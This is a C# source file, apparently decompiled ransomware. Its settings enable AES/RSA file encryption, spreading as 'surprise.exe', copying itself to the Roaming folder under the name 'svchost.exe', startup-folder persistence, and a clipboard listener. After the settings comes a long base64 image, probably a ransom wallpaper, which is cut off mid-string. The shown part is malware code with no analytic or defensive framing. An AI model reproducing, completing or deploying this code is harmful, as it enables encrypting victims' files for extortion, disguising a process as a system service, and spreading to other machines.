using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQEAeAB4AAD/2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz/2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz/wAARCAKIBIADASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD5rooor8DP9oAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiv6D/ANovRLNf+CX/AIxtBaWv2WD4b3TRw+UvlxlNOZkIXGAVYAjHQgEV7OXZR9bwtfEKVvZJO1t9JPe+nw9nuflfiR4mrhPEYCg8N7b61Nwvz8vLZxV/hlzfFtptufz4UUUV4x+qBRRRQAUUUUAFFFFABRRRQAUUV+uf/BuNZQr8DviJceVF9obXYYzLsG8oLcELnrgEk49zXrZNlf1+u6HNy6Xva/bzXc+E8SONlwnkVTOnR9tyOK5eblvzSS+Llla177M/Iyivpz/gsjYw6f8A8FJPiVHBDFAhlsJCsaBQWbTrVmbA7liST3JJr5jrzKkOSbg+h9Hw9myzXKsLmijy+3pwqct7254qVr2V7Xteyv2CiiioPYCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooro/hD8OLv4w/FXw34UsCVvPEmp2+mxMFLbGmkVNxA7Ddk+wrWjSlVqRpQ3k0l6sxxFenQpSr1XaMU232S1bPsL/gmF/wAEgLn9r3RY/HHjm7v9C8CecUsre2UJd64VJDlXYERwhht34JYhgNuN1ff+tfAX9j39kq3t9D8Q6J8HdGuQgKQeIvs17fup53n7SXlIOPvHj0612n7W3xU0/wDYA/YT1nUvDlrDap4T0iHSdAtyu5I5m229uWH8QVmDtn7wVuec1/Pr4l8S6h4z8Q3urate3WpanqU73N3d3MhkmuJXJZndjyWJJJJr7fH4rC5PKOEw9JTna8pNd/8APe3RW3vc/jzhnA8QeK2JxOb4vH1MLgKc3CnTpu19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